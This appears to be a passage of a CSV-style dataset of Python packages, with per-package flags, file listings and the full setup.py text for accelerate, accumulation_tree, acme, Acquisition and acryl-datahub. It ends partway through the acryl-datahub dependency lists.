accelerate-0.12.0,0,1,1,1,1,0,0,0,LICENSE PKG-INFO pyproject.toml README.md setup.cfg setup.py accelerator.py big_modeling.py checkpointing.py accelerate_cli.py cluster.py config_args.py config_utils.py sagemaker.py __init__.py env.py launch.py test.py __init__.py data_loader.py hooks.py launchers.py logging.py memory_utils.py optimizer.py scheduler.py state.py examples.py test_checkpointing.py test_metrics.py test_peak_memory_usage.py test_performance.py __init__.py test_script.py test_sync.py __init__.py testing.py training.py __init__.py tracking.py constants.py dataclasses.py deepspeed.py imports.py launch.py memory.py modeling.py offload.py operations.py other.py random.py tqdm.py versions.py __init__.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"# Copyright 2021 The HuggingFace Team. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from setuptools import setup
from setuptools import find_packages

extras = {}
extras[""quality""] = [""black ~= 22.0"", ""isort >= 5.5.4"", ""flake8 >= 3.8.3"", ""hf-doc-builder >= 0.3.0""]
extras[""docs""] = []
extras[""test_prod""] = [""pytest"", ""pytest-xdist"", ""pytest-subtests"", ""parameterized""]
extras[""test_dev""] = [""datasets"", ""evaluate"", ""transformers"", ""scipy"", ""sklearn"", ""deepspeed<0.7.0"", ""tqdm""]
extras[""testing""] = extras[""test_prod""] + extras[""test_dev""]

extras[""test_trackers""] = [""wandb"", ""comet-ml"", ""tensorboard""]
extras[""dev""] = extras[""quality""] + extras[""testing""]

extras[""sagemaker""] = [
    ""sagemaker"",  # boto3 is a required package in sagemaker
]

setup(
    name=""accelerate"",
    version=""0.12.0"",
    description=""Accelerate"",
    long_description=open(""README.md"", ""r"", encoding=""utf-8"").read(),
    long_description_content_type=""text/markdown"",
    keywords=""deep learning"",
    license=""Apache"",
    author=""The HuggingFace team"",
    author_email=""sylvain@huggingface.co"",
    url=""https://github.com/huggingface/accelerate"",
    package_dir={"""": ""src""},
    packages=find_packages(""src""),
    entry_points={
        ""console_scripts"": [
            ""accelerate=accelerate.commands.accelerate_cli:main"",
            ""accelerate-config=accelerate.commands.config:main"",
            ""accelerate-launch=accelerate.commands.launch:main"",
        ]
    },
    python_requires="">=3.7.0"",
    install_requires=[""numpy>=1.17"", ""packaging>=20.0"", ""psutil"", ""pyyaml"", ""torch>=1.4.0""],
    extras_require=extras,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: Education"",
        ""Intended Audience :: Science/Research"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Topic :: Scientific/Engineering :: Artificial Intelligence"",
    ],
)

# Release checklist
# 1. Change the version in __init__.py and setup.py.
# 2. Commit these changes with the message: ""Release: VERSION""
# 3. Add a tag in git to mark the release: ""git tag VERSION -m 'Adds tag VERSION for pypi' ""
#    Push the tag to git: git push --tags origin main
# 4. Run the following commands in the top-level directory:
#      python setup.py bdist_wheel
#      python setup.py sdist
# 5. Upload the package to the pypi test server first:
#      twine upload dist/* -r pypitest
#      twine upload dist/* -r pypitest --repository-url=https://test.pypi.org/legacy/
# 6. Check that you can install it in a virtualenv by running:
#      pip install -i https://testpypi.python.org/pypi accelerate
#      accelerate env
#      accelerate test
# 7. Upload the final version to actual pypi:
#      twine upload dist/* -r pypi
# 8. Add release notes to the tag in github once everything is looking hunky-dory.
# 9. Update the version in __init__.py, setup.py to the new version ""-dev"" and push to master
",0
accumulation_tree-0.6.2,0,1,1,1,1,0,1,0,abctree.py accumulation_tree.pyx treeslice.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO README.md setup.cfg setup.py,"import os
from setuptools import setup, Extension

setup(
    name = 'accumulation_tree',
    version = '0.6.2',
    description = 'Red/black tree with support for fast accumulation of values in a key range',
    author = 'Timo Kluck',
    author_email = 'tkluck@infty.nl',
    url='https://github.com/tkluck/accumulation_tree',
    long_description=""""""
A red/black tree which also stores partial aggregations at each node, making
getting aggregations of key range slices an O(log(N)) operation.
"""""",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python"",
        ""Topic :: Scientific/Engineering"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 3"",
    ],
    license='MIT',
    keywords='BST, data structure, accumulation',
    setup_requires=[""cython""],
    packages=['accumulation_tree'],
    ext_modules = [
        Extension('accumulation_tree.accumulation_tree', ['accumulation_tree/accumulation_tree.pyx'])
    ],
)
",1
acme-1.29.0,0,1,1,1,0,0,1,0,challenges.py client.py crypto_util.py errors.py fields.py jws.py magic_typing.py messages.py mixins.py py.typed standalone.py util.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt .gitignore challenges.rst client.rst errors.rst fields.rst jose.rst messages.rst standalone.rst api.rst conf.py index.rst jws-help.txt make.bat Makefile jws.rst .gitignore .gitignore http01_example.py LICENSE.txt MANIFEST.in PKG-INFO pytest.ini README.rst setup.cfg setup.py challenges_test.py client_test.py crypto_util_test.py errors_test.py fields_test.py jose_test.py jws_test.py magic_typing_test.py messages_test.py standalone_test.py cert-100sans.pem cert-idnsans.pem cert-ipsans.pem cert-ipv6sans.pem cert-nocn.der cert-san.pem cert.der cert.pem critical-san.pem csr-100sans.pem csr-6sans.pem csr-idnsans.pem csr-ipsans.pem csr-ipv6sans.pem csr-mixed.pem csr-nosans.pem csr-san.pem csr.der csr.pem dsa512_key.pem ec_secp384r1_key.pem README rsa1024_cert.pem rsa1024_key.pem rsa2048_cert.pem rsa2048_key.pem rsa256_key.pem rsa4096_cert.pem rsa4096_key.pem rsa512_key.pem test_util.py util_test.py,"import sys

from setuptools import find_packages
from setuptools import setup

version = '1.29.0'

install_requires = [
    'cryptography>=2.5.0',
    'josepy>=1.13.0',
    'PyOpenSSL>=17.5.0',
    'pyrfc3339',
    'pytz>=2019.3',
    'requests>=2.20.0',
    'requests-toolbelt>=0.3.0',
    'setuptools>=41.6.0',
]

docs_extras = [
    'Sphinx>=1.0',  # autodoc_member_order = 'bysource', autodoc_default_flags
    'sphinx_rtd_theme',
]

test_extras = [
    'pytest',
    'pytest-xdist',
    'typing-extensions',
]

setup(
    name='acme',
    version=version,
    description='ACME protocol implementation in Python',
    url='https://github.com/letsencrypt/letsencrypt',
    author=""Certbot Project"",
    author_email='certbot-dev@eff.org',
    license='Apache License 2.0',
    python_requires='>=3.7',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Apache Software License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Topic :: Internet :: WWW/HTTP',
        'Topic :: Security',
    ],

    packages=find_packages(),
    include_package_data=True,
    install_requires=install_requires,
    extras_require={
        'docs': docs_extras,
        'test': test_extras,
    },
)
",0
Acquisition-4.10,0,1,1,1,1,0,0,0,.coveragerc .manylinux-install.sh .manylinux.sh appveyor.yml buildout.cfg CHANGES.rst COPYRIGHT.txt ExtensionClass.h _compat.h LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py Acquisition.h interfaces.py tests.py _Acquisition.c __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt tox.ini,"##############################################################################
#
# Copyright (c) 2007 Zope Foundation and Contributors.
# All Rights Reserved.
#
# This software is subject to the provisions of the Zope Public License,
# Version 2.1 (ZPL).  A copy of the ZPL should accompany this distribution.
# THIS SOFTWARE IS PROVIDED ""AS IS"" AND ANY AND ALL EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND FITNESS
# FOR A PARTICULAR PURPOSE.
#
##############################################################################
""""""Setup for the Acquisition distribution
""""""
import os
import platform
from setuptools import setup, find_packages, Extension

with open('README.rst') as f:
    README = f.read()

with open('CHANGES.rst') as f:
    CHANGES = f.read()

# PyPy won't build the extension.
py_impl = getattr(platform, 'python_implementation', lambda: None)
is_pypy = py_impl() == 'PyPy'
if is_pypy:
    ext_modules = []
else:
    ext_modules = [
        Extension(""Acquisition._Acquisition"",
                  [os.path.join('src', 'Acquisition', '_Acquisition.c')],
                  include_dirs=['include', 'src']),
    ]

version = '4.10'

setup(
    name='Acquisition',
    version=version,
    url='https://github.com/zopefoundation/Acquisition',
    license='ZPL 2.1',
    description=""Acquisition is a mechanism that allows objects to obtain ""
    ""attributes from the containment hierarchy they're in."",
    author='Zope Foundation and Contributors',
    author_email='zope-dev@zope.org',
    long_description='\n\n'.join([README, CHANGES]),
    packages=find_packages('src'),
    package_dir={'': 'src'},
    classifiers=[
        ""Development Status :: 6 - Mature"",
        ""Environment :: Web Environment"",
        ""Framework :: Zope :: 2"",
        ""Framework :: Zope :: 4"",
        ""Framework :: Zope :: 5"",
        ""License :: OSI Approved :: Zope Public License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
    ],
    ext_modules=ext_modules,
    python_requires='>=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*,!=3.4.*',
    install_requires=[
        'ExtensionClass >= 4.2.0',
        'zope.interface',
    ],
    extras_require={
        'test': ['zope.testrunner'],
    },
    include_package_data=True,
    zip_safe=False,
)
",0
acryl-datahub-0.8.43.1,0,1,1,0,1,0,0,0,PKG-INFO pyproject.toml README.md setup.cfg setup.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt assertion_circuit_breaker.py circuit_breaker.py operation_circuit_breaker.py __init__.py dataflow.py datajob.py __init__.py dataprocess_instance.py __init__.py __init__.py assertion.py base.py operation.py __init__.py __init__.py check_cli.py cli_utils.py delete_cli.py docker.py docker_check.py get_cli.py ingest_cli.py json_file.py migrate.py migration_utils.py put_cli.py telemetry.py timeline_cli.py __init__.py common.py config_loader.py github.py import_resolver.py kafka.py source_common.py time_window_config.py toml.py yaml.py __init__.py kafka_emitter.py mce_builder.py mcp.py mcp_builder.py request_helper.py rest_emitter.py serialization_helper.py __init__.py entrypoints.py closeable.py committable.py common.py decorators.py ingestion_job_checkpointing_provider_base.py ingestion_job_reporting_provider_base.py ingestion_job_state_provider.py ingestion_state_provider.py registry.py report.py sink.py source.py transform.py workunit.py __init__.py extractor_registry.py mce_extractor.py protobuf_util.py schema_util.py __init__.py client.py __init__.py datahub_ingestion_reporting_provider.py reporting_provider_registry.py __init__.py connection.py pipeline.py __init__.py console.py datahub_kafka.py datahub_rest.py file.py sink_registry.py __init__.py aws_common.py glue.py path_spec.py s3_boto_utils.py s3_util.py sagemaker.py common.py feature_groups.py jobs.py job_classes.py lineage.py models.py __init__.py __init__.py azure_common.py __init__.py confluent_schema_registry.py csv_enricher.py config.py data_lake_utils.py profiling.py report.py __init__.py dbt.py config.py delta_lake_utils.py report.py source.py __init__.py elastic_search.py feast.py Dockerfile ingest.py requirements.txt __init__.py feast_legacy.py file.py ge_data_profiler.py ge_profiling_config.py glue_profiling_config.py iceberg.py iceberg_common.py iceberg_profiler.py __init__.py azure_ad.py okta.py __init__.py kafka.py kafka_connect.py kafka_schema_registry_base.py ldap.py looker.py looker_common.py lookml.py metabase.py business_glossary.py lineage.py __init__.py metadata_common.py mode.py mongodb.py nifi.py openapi.py openapi_parser.py powerbi.py common.py __init__.py pulsar.py redash.py config.py profiling.py report.py source.py __init__.py __init__.py salesforce.py avro.py base.py csv_tsv.py json.py object.py parquet.py __init__.py source_registry.py athena.py bigquery.py clickhouse.py druid.py hana.py hive.py mariadb.py mssql.py mysql.py oauth_generator.py oracle.py postgres.py presto_on_hive.py redshift.py snowflake.py sql_common.py sql_generic.py sql_types.py trino.py vertica.py __init__.py checkpoint.py dbt_state.py kafka_state.py sql_common_state.py stateful_ingestion_base.py usage_common_state.py __init__.py datahub_ingestion_checkpointing_p state_provider_registry.py __init__.py superset.py tableau.py tableau_common.py bigquery_usage.py clickhouse_usage.py redshift_usage.py snowflake_usage.py starburst_trino_usage.py usage_common.py __init__.py __init__.py bigquery.py csv_enricher.py pulsar.py bigquery.py snowflake.py __init__.py bigquery_usage.py snowflake_usage.py __init__.py __init__.py pulsar.py bigquery.py snowflake.py __init__.py time_window.py bigquery_usage.py snowflake_usage.py __init__.py __init__.py add_dataset_browse_path.py add_dataset_ownership.py add_dataset_properties.py add_dataset_schema_tags.py add_dataset_schema_terms.py add_dataset_tags.py add_dataset_terms.py base_transformer.py dataset_domain.py dataset_transformer.py mark_dataset_status.py remove_dataset_ownership.py transform_registry.py __init__.py __init__.py action.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py __init__.py schema.avsc AssertionInfo.avsc AssertionKey.avsc AssertionRunEvent.avsc BrowsePaths.avsc CaveatsAndRecommendations.avsc ChartInfo.avsc ChartKey.avsc ChartQuery.avsc ChartUsageStatistics.avsc Container.avsc ContainerKey.avsc ContainerProperties.avsc CorpGroupEditableInfo.avsc CorpGroupInfo.avsc CorpGroupKey.avsc CorpUserCredentials.avsc CorpUserEditableInfo.avsc CorpUserInfo.avsc CorpUserKey.avsc CorpUserStatus.avsc Cost.avsc DashboardInfo.avsc DashboardKey.avsc DashboardUsageStatistics.avsc DataFlowInfo.avsc DataFlowKey.avsc DataHubAccessTokenInfo.avsc DataHubAccessTokenKey.avsc DatahubIngestionCheckpoint.avsc DatahubIngestionRunSummary.avsc DataHubIngestionSourceInfo.avsc DataHubIngestionSourceKey.avsc DataHubPolicyInfo.avsc DataHubPolicyKey.avsc DataHubRetentionConfig.avsc DataHubRetentionKey.avsc DataHubSecretKey.avsc DataHubSecretValue.avsc DataHubUpgradeKey.avsc DataHubUpgradeRequest.avsc DataHubUpgradeResult.avsc DataJobInfo.avsc DataJobInputOutput.avsc DataJobKey.avsc DataPlatformInfo.avsc DataPlatformInstance.avsc DataPlatformInstanceKey.avsc DataPlatformKey.avsc DataProcessInfo.avsc DataProcessInstanceInput.avsc DataProcessInstanceKey.avsc DataProcessInstanceOutput.avsc DataProcessInstanceProperties.avsc DataProcessInstanceRelationships.avsc DataProcessInstanceRunEvent.avsc DataProcessKey.avsc DatasetDeprecation.avsc DatasetKey.avsc DatasetProfile.avsc DatasetProperties.avsc DatasetUpstreamLineage.avsc DatasetUsageStatistics.avsc Deprecation.avsc DomainKey.avsc DomainProperties.avsc Domains.avsc EditableChartProperties.avsc EditableContainerProperties.avsc EditableDashboardProperties.avsc EditableDataFlowProperties.avsc EditableDataJobProperties.avsc EditableDatasetProperties.avsc EditableMLFeatureProperties.avsc EditableMLFeatureTableProperties.avsc EditableMLModelGroupProperties.avsc EditableMLModelProperties.avsc EditableMLPrimaryKeyProperties.avsc EditableNotebookProperties.avsc EditableSchemaMetadata.avsc EntityChangeEvent.avsc EthicalConsiderations.avsc EvaluationData.avsc ExecutionRequestInput.avsc ExecutionRequestKey.avsc ExecutionRequestResult.avsc ExecutionRequestSignal.avsc GlobalTags.avsc GlossaryNodeInfo.avsc GlossaryNodeKey.avsc GlossaryRelatedTerms.avsc GlossaryTermInfo.avsc GlossaryTermKey.avsc GlossaryTerms.avsc GroupMembership.avsc InstitutionalMemory.avsc IntendedUse.avsc InviteToken.avsc InviteTokenKey.avsc MetadataChangeEvent.avsc MetadataChangeLog.avsc MetadataChangeProposal.avsc Metrics.avsc MLFeatureKey.avsc MLFeatureProperties.avsc MLFeatureTableKey.avsc MLFeatureTableProperties.avsc MLHyperParam.avsc MLMetric.avsc MLModelDeploymentKey.avsc MLModelDeploymentProperties.avsc MLModelFactorPrompts.avsc MLModelGroupKey.avsc MLModelGroupProperties.avsc MLModelKey.avsc MLModelProperties.avsc MLPrimaryKeyKey.avsc MLPrimaryKeyProperties.avsc NativeGroupMembership.avsc NotebookContent.avsc NotebookInfo.avsc NotebookKey.avsc Operation.avsc Origin.avsc Ownership.avsc PlatformEvent.avsc QuantitativeAnalyses.avsc SchemaFieldKey.avsc SchemaMetadata.avsc Siblings.avsc SourceCode.avsc Status.avsc SubTypes.avsc TagKey.avsc TagProperties.avsc TelemetryClientId.avsc TelemetryKey.avsc TestInfo.avsc TestKey.avsc TestResults.avsc TrainingData.avsc UpstreamLineage.avsc UsageAggregation.avsc VersionInfo.avsc ViewProperties.avsc __init__.py schema_classes.py __init__.py py.typed stats.py telemetry.py __init__.py upgrade.py __init__.py bigquery_sql_parser.py checkpoint_state_util.py config_clean.py dedup_list.py delayed_iter.py hive_schema_to_avro.py mapping.py memory_leak_detector.py parsing_util.py perf_timer.py domain_registry.py __init__.py server_config_util.py sqlalchemy_query_combiner.py sqllineage_patch.py sql_formatter.py sql_lineage_parser_impl.py sql_parser.py corpuser_urn.py corp_group_urn.py dataset_urn.py data_flow_urn.py data_job_urn.py data_platform_urn.py data_process_instance_urn.py domain_urn.py error.py notebook_urn.py tag_urn.py urn.py __init__.py __init__.py __init__.py __main__.py airflow_generator.py __init__.py entities.py generic_recipe_sample_dag.py lineage_backend_demo.py lineage_backend_taskflow_demo.py lineage_emission_dag.py mysql_sample_dag.py __init__.py datahub.py __init__.py datahub.py __init__.py datahub.py datahub_assertion_operator.py datahub_assertion_sensor.py datahub_operation_operator.py datahub_operation_sensor.py __init__.py _lineage_core.py __init__.py,"import os
from typing import Dict, Set

import setuptools

package_metadata: dict = {}
with open(""./src/datahub/__init__.py"") as fp:
    exec(fp.read(), package_metadata)


def get_long_description():
    root = os.path.dirname(__file__)
    with open(os.path.join(root, ""README.md"")) as f:
        description = f.read()

    return description


base_requirements = {
    # Typing extension should be >=3.10.0.2 ideally but we can't restrict due to Airflow 2.0.2 dependency conflict
    ""typing_extensions>=3.7.4.3 ;  python_version < '3.8'"",
    ""typing_extensions>=3.10.0.2 ;  python_version >= '3.8'"",
    ""mypy_extensions>=0.4.3"",
    # Actual dependencies.
    ""typing-inspect"",
    ""pydantic>=1.5.1"",
    ""mixpanel>=4.9.0"",
}

framework_common = {
    ""click>=6.0.0"",
    ""click-default-group"",
    ""PyYAML"",
    ""toml>=0.10.0"",
    ""entrypoints"",
    ""docker"",
    ""expandvars>=0.6.5"",
    ""avro-gen3==0.7.4"",
    ""avro>=1.10.2,<1.11"",
    ""python-dateutil>=2.8.0"",
    ""stackprinter"",
    ""tabulate"",
    ""progressbar2"",
    ""termcolor>=1.0.0"",
    ""types-termcolor>=1.0.0"",
    ""psutil>=5.8.0"",
    ""ratelimiter"",
    # Markupsafe breaking change broke Jinja and some other libs
    # Pinning it to a version which works even though we are not using explicitly
    # https://github.com/aws/aws-sam-cli/issues/3661
    # Airflow compatibility: https://github.com/apache/airflow/blob/2.2.2/setup.cfg#L125
    ""markupsafe>=1.1.1,<=2.0.1"",
    ""Deprecated"",
    ""types-Deprecated"",
    ""humanfriendly"",
    ""packaging"",
    ""aiohttp<4"",
}

kafka_common = {
    # The confluent_kafka package provides a number of pre-built wheels for
    # various platforms and architectures. However, it does not provide wheels
    # for arm64 (including M1 Macs) or aarch64 (Docker's linux/arm64). This has
    # remained an open issue on the confluent_kafka project for a year:
    #   - https://github.com/confluentinc/confluent-kafka-python/issues/1182
    #   - https://github.com/confluentinc/confluent-kafka-python/pull/1161
    #
    # When a wheel is not available, we must build from source instead.
    # Building from source requires librdkafka to be installed.
    # Most platforms have an easy way to install librdkafka:
    #   - MacOS: `brew install librdkafka` gives latest, which is 1.9.x or newer.
    #   - Debian: `apt install librdkafka` gives 1.6.0 (https://packages.debian.org/bullseye/librdkafka-dev).
    #   - Ubuntu: `apt install librdkafka` gives 1.8.0 (https://launchpad.net/ubuntu/+source/librdkafka).
    #
    # Moreover, confluent_kafka 1.9.0 introduced a hard compatibility break, and
    # requires librdkafka >=1.9.0. As such, installing confluent_kafka 1.9.x on
    # most arm64 Linux machines will fail, since it will build from source but then
    # fail because librdkafka is too old. Hence, we have added an extra requirement
    # that requires confluent_kafka<1.9.0 on non-MacOS arm64/aarch64 machines, which
    # should ideally allow the builds to succeed in default conditions. We still
    # want to allow confluent_kafka >= 1.9.0 for M1 Macs, which is why we can't
    # broadly restrict confluent_kafka to <1.9.0.
    #
    # Note that this is somewhat of a hack, since we don't actually require the
    # older version of confluent_kafka on those machines. Additionally, we will
    # need monitor the Debian/Ubuntu PPAs and modify this rule if they start to
    # support librdkafka >= 1.9.0.
    ""confluent_kafka>=1.5.0"",
    'confluent_kafka<1.9.0; platform_system != ""Darwin"" and (platform_machine == ""aarch64"" or platform_machine == ""arm64"")',
    # We currently require both Avro libraries. The codegen uses avro-python3 (above)
    # schema parsers at runtime for generating and reading JSON into Python objects.
    # At the same time, we use Kafka's AvroSerializer, which internally relies on
    # fastavro for serialization. We do not use confluent_kafka[avro], since it
    # is incompatible with its own dep on avro-python3.
    ""fastavro>=1.2.0"",
}

kafka_protobuf = {
    ""networkx>=2.6.2"",
    # Required to generate protobuf python modules from the schema downloaded from the schema registry
    ""grpcio==1.44.0"",
    ""grpcio-tools==1.44.0"",
    ""types-protobuf"",
}

sql_common = {
    # Required for all SQL sources.
    ""sqlalchemy==1.3.24"",
    # Required for SQL profiling.
    ""great-expectations>=0.14.11,<0.15.3"",
    # datahub does not depend on Jinja2 directly but great expectations does. With Jinja2 3.1.0 GE 0.14.11 is breaking
    ""Jinja2<3.1.0"",
    # datahub does not depend on traitlets directly but great expectations does.
    # https://github.com/ipython/traitlets/issues/741
    ""traitlets<5.2.2"",
    ""greenlet"",
}

aws_common = {
    # AWS Python SDK
    ""boto3"",
    # Deal with a version incompatibility between botocore (used by boto3) and urllib3.
    # See https://github.com/boto/botocore/pull/2563.
    ""botocore!=1.23.0"",
}

path_spec_common = {
    ""parse>=1.19.0"",
    ""wcmatch"",
}

looker_common = {
    # Looker Python SDK
    ""looker-sdk==22.2.1""
}

bigquery_common = {
    # Google cloud logging library
    ""google-cloud-logging<3.1.2"",
    ""google-cloud-bigquery"",
    ""more-itertools>=8.12.0"",
    # we do not use protobuf directly but newer version caused bigquery connector to fail
    ""protobuf<=3.20.1"",
}

redshift_common = {
    ""sqlalchemy-redshift"",
    ""psycopg2-binary"",
    ""GeoAlchemy2"",
    ""sqllineage==1.3.5"",
    *path_spec_common,
}

snowflake_common = {
    # Snowflake plugin utilizes sql common
    *sql_common,
    # Required for all Snowflake sources
    ""snowflake-sqlalchemy<=1.2.4"",
    ""cryptography"",
    ""msal"",
}

trino = {
    ""trino>=0.308"",
    ""trino[sqlalchemy]>=0.308"",
}

microsoft_common = {""msal==1.16.0""}

data_lake_base = {
    *aws_common,
    ""parse>=1.19.0"",
    ""pyarrow>=6.0.1"",
    ""tableschema>=1.20.2"",
    ""ujson>=4.3.0"",
    ""types-ujson>=4.2.1"",
    ""smart-open[s3]>=5.2.1"",
}

data_lake_profiling = {
    ""pydeequ==1.0.1"",
    ""pyspark==3.0.3"",
}

iceberg_common = {
    # Iceberg Python SDK
    ""acryl-iceberg-legacy==0.0.4"",
    ""azure-identity==1.10.0"",
}

s3_base = {*data_lake_base, ""moto[s3]"", *path_spec_common}

delta_lake = {
    *s3_base,
    ""deltalake"",
}

usage_common = {
    ""sqlparse"",
}


# Note: for all of these, framework_common will be added.
plugins: Dict[str, Set[str]] = {
    # Sink plugins.
    ""datahub-kafka"": kafka_common,
    ""datahub-rest"": {""requests""},
    # Integrations.
    ""airflow"": {
        ""apache-airflow >= 1.10.2"",
    },
    ""circuit-breaker"": {
        ""gql>=3.3.0"",
        ""gql[requests]>=3.3.0"",
    },
    ""great-expectations"": sql_common | {""sqllineage==1.3.5""},
    # Source plugins
    # PyAthena is pinned with exact version because we use private method in PyAthena
    ""athena"": sql_common | {""PyAthena[SQLAlchemy]==2.4.1""},
    ""azure-ad"": set(),
    ""bigquery"": sql_common
    | bigquery_common
    | {""sqlalchemy-bigquery>=1.4.1"", ""sqllineage==1.3.5"", ""sqlparse""},
    ""bigquery-usage"": bigquery_common | usage_common | {""cachetools""},
    ""clickhouse"": sql_common | {""clickhouse-sqlalchemy==0.1.8""},
    ""clickhouse-usage"": sql_common
    | usage_common
    | {
        ""clickhouse-sqlalchemy==0.1.8"",
    },
    ""datahub-lineage-file"": set(),
    ""datahub-business-glossary"": set(),
    ""data-lake"": {*data_lake_base, *data_lake_profiling},
    ""s3"": {*s3_base, *data_lake_profiling},
    ""delta-lake"": {*data_lake_profiling, *delta_lake},
    ""dbt"": {""requests"", ""cached_property""} | aws_common,
    ""druid"": sql_common | {""pydruid>=0.6.2""},
    # Starting with 7.14.0 python client is checking if it is connected to elasticsearch client. If its not it throws
    # UnsupportedProductError
    # https://www.elastic.co/guide/en/elasticsearch/client/python-api/current/release-notes.html#rn-7-14-0
    # https://github.com/elastic/elasticsearch-py/issues/1639#issuecomment-883587433
    ""elasticsearch"": {""elasticsearch==7.13.4""},
    ""feast-legacy"": {""docker""},
    ""feast"": {""feast==0.18.0"", ""flask-openid>=1.3.0""},
    ""glue"": aws_common,
    # hdbcli is supported officially by SAP, sqlalchemy-hana is built on top but not officially supported
    ""hana"": sql_common
    | {
        ""sqlalchemy-hana>=0.5.0; platform_machine != 'aarch64' and platform_machine != 'arm64'"",
        ""hdbcli>=2.11.20; platform_machine != 'aarch64' and platform_machine != 'arm64'"",
    },
    ""hive"": sql_common
    | {
        # Acryl Data maintains a fork of PyHive
        # - 0.6.11 adds support for table comments and column comments,
        #   and also releases HTTP and HTTPS transport schemes
        # - 0.6.12 adds support for Spark Thrift Server
        ""acryl-pyhive[hive]>=0.6.13""
    },
    ""iceberg"": iceberg_common,
    ""kafka"": {*kafka_common, *kafka_protobuf},
    ""kafka-connect"": sql_common | {""requests"", ""JPype1""},
    ""ldap"": {""python-ldap>=2.4""},
    ""looker"": looker_common,
    # lkml>=1.1.2 is required to support the sql_preamble expression in LookML
    ""lookml"": looker_common
    | {""lkml>=1.1.2"", ""sql-metadata==2.2.2"", ""sqllineage==1.3.5""},
    ""metabase"": {""requests"", ""sqllineage==1.3.5""},
    ""mode"": {""requests"", ""sqllineage==1.3.5"", ""tenacity>=8.0.1""},
    ""mongodb"": {""pymongo>=3.11"", ""packaging""},
    ""mssql"": sql_common | {""sqlalchemy-pytds>=0.3""},
    ""mssql-odbc"": sql_common | {""pyodbc""},
    ""mysql"": sql_common | {""pymysql>=1.0.2""},
    # mariadb should have same dependency as mysql
    ""mariadb"": sql_common | {""pymysql>=1.0.2""},
    ""okta"": {""okta~=1.7.0""},
    ""oracle"": sql_common | {""cx_Oracle""},
    ""postgres"": sql_common | {""psycopg2-binary"", ""GeoAlchemy2""},
    ""presto-on-hive"": sql_common
    | {""psycopg2-binary"", ""acryl-pyhive[hive]>=0.6.12"", ""pymysql>=1.0.2""},
    ""pulsar"": {""requests""},
    ""redash"": {""redash-toolbelt"", ""sql-metadata"", ""sqllineage==1.3.5""},
    ""redshift"": sql_common | redshift_common,
    ""redshift-usage"": sql_common | usage_common | redshift_common,
    ""sagemaker"": aws_common,
    ""salesforce"": {""simple-salesforce""},
    ""snowflake"": snowflake_common,
    ""snowflake-usage"": snowflake_common
    | usage_common
    | {
        ""more-itertools>=8.12.0"",
    },
    ""sqlalchemy"": sql_common,
    ""superset"": {
        ""requests"",
        ""sqlalchemy"",
        ""great_expectations"",
        ""greenlet"",
        ""Jinja2<3.1.0"",
    },
    ""tableau"": {""tableauserverclient>=0.17.0""},
    ""trino"": sql_common | trino,
    ""starburst-trino-usage"": sql_common | usage_common | trino,
    ""nifi"": {""requests"", ""packaging""},
    ""powerbi"": microsoft_common,
    ""vertica"": sql_common | {""sqlalchemy-vertica[vertica-python]==0.0.5""},
}

all_exclude_plugins: Set[str] = {
    # SQL Server ODBC requires additional drivers, and so we don't want to keep
    # it included in the default ""all"" installation.
    ""mssql-odbc"",
}

mypy_stubs = {
    ""types-dataclasses"",
    ""sqlalchemy-stubs"",
    ""types-pkg_resources"",
    ""types-six"",
    ""types-python-dateutil"",
    ""types-requests"",
    ""types-toml"",
    ""types-PyMySQL"",
    ""types-PyYAML"",
    ""types-freezegun"",
    ""types-cachetools"",
    # versions 0.1.13 and 0.1.14 seem to have issues
    ""types-click==0.1.12"",
    ""boto3-stubs[s3,glue,sagemaker]"",
    ""types-tabulate"",
    # avrogen package requires this
    ""types-pytz"",
    ""types-pyOpenSSL"",
}

base_dev_requirements = {
    *base_requirements,
    *framework_common,
    *mypy_stubs,
